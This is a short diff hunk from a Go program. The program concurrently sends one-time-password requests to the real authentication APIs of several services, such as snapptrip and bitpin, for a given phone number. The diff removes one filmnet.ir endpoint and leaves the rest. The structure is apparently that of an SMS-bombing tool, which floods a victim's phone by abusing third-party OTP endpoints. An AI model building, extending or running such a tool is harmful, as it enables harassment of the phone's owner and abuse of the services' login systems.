@@ -475,9 +475,6 @@ func main() {
 		go sms("https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
 			"phoneNumber": "phone",
 		}, ch)  // edit :4/22/2025
-		go sms(fmt.Sprintf("https://api-v2.filmnet.ir/access-token/users/%v/otp", phone), map[string]interface{}{
-			"monsmain": "monsmain",
-		}, ch) // i don't know??
 		go sms("https://api.bitpin.org/v3/usr/authenticate/", map[string]interface{}{
 			"phone": "phone",
 		}, ch)  // edit :4/22/2025
